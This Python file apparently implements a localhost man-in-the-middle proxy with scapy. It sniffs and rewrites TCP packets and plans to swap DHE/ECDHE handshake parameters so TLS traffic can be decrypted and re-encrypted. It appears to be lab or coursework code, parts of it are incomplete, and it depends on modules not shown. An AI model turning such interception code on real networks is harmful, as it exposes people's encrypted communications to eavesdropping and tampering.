from scapy.all import *
from test import *
from py_capture import Task
import queue
from multiprocessing import Process
import multiprocessing as mp
import subprocess

"""
Forward TCP packet, and modify TLS packet.

if istcp:
    forward()
else:
    parsetls()
    if change_cipherspec() == DHE:
        if from_src():
            is_dhe = True
            change_param_and_forward()
            pre_master1, pre_master2 = get_two_param(param1, param2)
            key1, key2 = derive_keys(pre_m1, pre_m2)

    if tls_data && is_dhe:
        if from_src():
            plain_packet = derypt_use_masterkey1(packet)
            enc_packet = encrypted_use_masterkey2(plain_packet)
            forward2dst(enc_packet)
        else:
            ...
            ...
            ...

    if nottls & from_source():
        forward2dst() 
    else:
        forward2src() 
"""

class MITM:
    """
    Config ip table to block the client => server, only allow client <-> server.
    """
    def __init__(self, local_ip, local_port, client_ip, server_ip, server_port):
        self.client_ip = client_ip
        self.server_ip = server_ip 
        self.server_port = server_port
        self.local_ip = local_ip
        self.local_port = local_port
        self.task = Task(PktHandler())
        self.tls_queue = mp.Queue()
        self.tcp_queue = mp.Queue()

        # single client <=> server connection.
        # why if condition: https://scapy.readthedocs.io/en/latest/troubleshooting.html
        if self.server_ip == self.local_ip:
            conf.L3socket = L3RawSocket 
            load_layer("tls")

        self.sock = conf.L3socket(iface="lo")

    def run(self):
        cip = self.client_ip
        sip = self.server_ip
        sport = self.server_port
        local_ip = self.local_ip
        lport = self.local_port

        brf = f"tcp and (dst port {lport} and dst net {local_ip})"

        # Enable worker, the packet must be executed in order.
        Process(target = self.tls_worker, daemon=True).start()
        Process(target = self.tcp_worker, daemon=True).start()

        sniff(prn = self.sender, filter=brf, iface="lo")

    def sender(self, pkt):
        ip = pkt.payload.payload
        if len(ip.payload) > 0:
            # TLS packet, need to process.
            self.tls_queue.put(pkt)
        else:
            # TCP packet, forward directly.
            self.tcp_queue.put(pkt)

    def tcp_worker(self):
        while True:
            pkt = self.tcp_queue.get()
            self.forward(pkt)

    def tls_worker(self):
        while True:
            pkt = self.tls_queue.get()
            self.parse(pkt)

    def forward(self, pkt):
        if pkt.sport == self.server_port:
            # from server => mitm => client
            pkt.payload.dst = self.client_ip
            pkt.payload.dport = self.cport
            pkt.payload.src = self.local_ip
            pkt.payload.sport = self.local_port
            del pkt.payload.chksum
            del pkt.payload.payload.chksum
            data = IP(bytes(pkt.payload))

            self.sock.send(data)
        else:
            # from client => mitm => server
            # store client src & dst.
            self.cport = pkt.payload.sport
            self.client_ip = pkt.payload.src

            # modify payload
            pkt.payload.dst = self.server_ip
            pkt.payload.dport = self.server_port
            pkt.payload.src = self.local_ip 
            pkt.payload.sport = self.local_port
            # recalculate headers checksum.
            del pkt.payload.payload.chksum
            del pkt.payload.chksum

            data = IP(bytes(pkt.payload))
            self.sock.send(data)
        
    def parse(self, pkt):
        tcp_data = bytes(pkt.payload.payload)
        seq = self.task.get_seq()

        tls_data = bytearray(bytes(pkt.payload.payload.payload))
        (state, isdhe) = self.task.handler.handle_packet(tls_data, tcp_data, seq)

        if isdhe:
            """
            DHE: need to build connection between server & client.
            from server key exchange, we know the DHE-key-cipher, and send 
            ECDHE param to client, then get the response.
            Store the param of the response from the client, modify the 
            content of the param, then forward it to the server.
            Then insert the derived ecdhe param to the parser.
            """
            tls_data = self.task.handler.MODIFIED_TLS_DHE
            del pkt.payload.payload.payload
            pkt = pkt / tls_data
        elif state == TASKSTATE.COMMUNICATION.value:
            self.task.increase()
        elif state == TASKSTATE.PASS.value:
            # already visited, retransmit; if no, the extended key derive will failed.
            self.tcp_queue.put(pkt)
            return

        self.forward(pkt)

if __name__ == "__main__":
    mitm = MITM("127.0.0.1", 5000, "127.0.0.1", "127.0.0.1", 2333)
    print("mitm start")
    mitm.run()
